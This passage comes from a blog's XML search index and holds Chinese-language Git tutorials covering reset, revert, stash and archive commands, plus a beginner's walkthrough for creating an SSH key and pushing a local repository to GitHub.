重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 $ git reset –hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 $ git reset –keep [commit] 新建一个commit，用来撤销指定commit后者的所有变化都将被前者抵消，并且应用到当前分支 $ git revert [commit] 暂时将未提交的变化移除，稍后再移入 $ git stash$ git stash pop 其他生成一个可供发布的压缩包 $ git archive]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>VersionContro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Git推送仓库到Github]]></title>
    <url>%2F2017%2F04%2F05%2F%E9%80%9A%E8%BF%87git%E5%91%BD%E4%BB%A4%E8%A1%8C%E3%80%82%2F</url>
    <content type="text"><![CDATA[刚开始试着想将自己的代码上传至github上的时候真的是个小白，Google上面到处搜到处找资源。后来云里雾里的成功上传后，发现网络上介绍的大致有两种方法，一种方法是通过git命令行，另一种方法是通过下载Github客户端或第三方工具，很多IDE也集成了git的大部分功能。 通过git命令行 ssh-keygen -t rsa -C “aunsetre@gmail.com“ //123 创建SSH Key 再去用户主目录里找到.ssh文件夹，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露，id_rsa.pub是公钥，可以公开。 去创建仓库 将仓库路径复制下来 git remote add origin git@github.com:flora0103/projects.git //关联一个远程库命令，git@github.com:flora0103/projects.git 这个是自己远程库git push -u origin master //关联后,第一次推送master分支的所有内容命令，此后，每次本地提交后，就可以使用命令git push origin master推送最新修改 初始化一个本地文件夹作为仓库 git init 仓库文件夹名称如我的就在命令行中输入:git projects 首先要将你想上传的代码文件夹拖至这个新出现的仓库文件夹，然后在命令行输入: cd 仓库文件夹名称 如我的就在命令行中输入: cd projects 这时你命令行中的目录就会出现在你的仓库目录下。 接下来输入: git add 你想上传的代码文件夹名称` 或者是输入: git add . (add后面的‘.’代表你仓库中的所有内容) 然后输入: git commit -m “你想交代的内容” 最后输入: git push origin master 一会儿后你就会在你github的仓库中看到你上传的代码文件夹啦。是不是都很简单呢！]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Github</tag>
      </tags>
  </entry>
</search>
